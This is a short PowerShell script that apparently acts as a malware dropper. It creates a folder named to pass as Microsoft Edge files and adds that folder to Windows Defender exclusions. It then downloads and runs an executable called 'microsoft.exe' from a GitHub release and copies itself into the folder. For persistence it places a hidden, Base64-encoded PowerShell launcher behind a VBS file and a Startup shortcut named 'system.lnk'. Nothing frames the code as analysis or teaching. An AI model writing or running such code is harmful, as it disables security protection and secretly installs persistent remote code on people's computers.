# Target hidden directory
$targetPath = "$env:APPDATA\MicrosoftEdge\"
New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
Add-MpPreference -ExclusionPath $targetPath

# Download EXE
$repo = "BotSolo621/WLP"
$file = "microsoft.exe"
$releases = "https://api.github.com/repos/$repo/releases"
Write-Host "Determining latest release"
$tag = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].tag_name
$download = "https://github.com/$repo/releases/download/$tag/$file"
$exePath = Join-Path $targetPath $file
Write-Host "Downloading latest release"
Invoke-WebRequest $download -OutFile $exePath
Write-Host "Download complete: $exePath"

# Copy this script as payload.ps1
$myScriptPath = $MyInvocation.MyCommand.Path
$payloadPath = Join-Path $targetPath "payload.ps1"
Copy-Item -Path $myScriptPath -Destination $payloadPath -Force

# Encode the PowerShell command
$command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Create a .vbs file that launches PowerShell silently
$vbsPath = Join-Path $targetPath "invis.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -EncodedCommand $encodedCommand", 0
"@
$vbsContent | Set-Content -Path $vbsPath -Encoding ASCII

# Create startup shortcut pointing to the VBS file
$WScriptShell = New-Object -ComObject WScript.Shell
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcut = $WScriptShell.CreateShortcut("$startupPath\system.lnk")
$shortcut.TargetPath = $vbsPath
$shortcut.WorkingDirectory = $targetPath
$shortcut.Save()

# Launch EXE now
Start-Process -FilePath $exePath
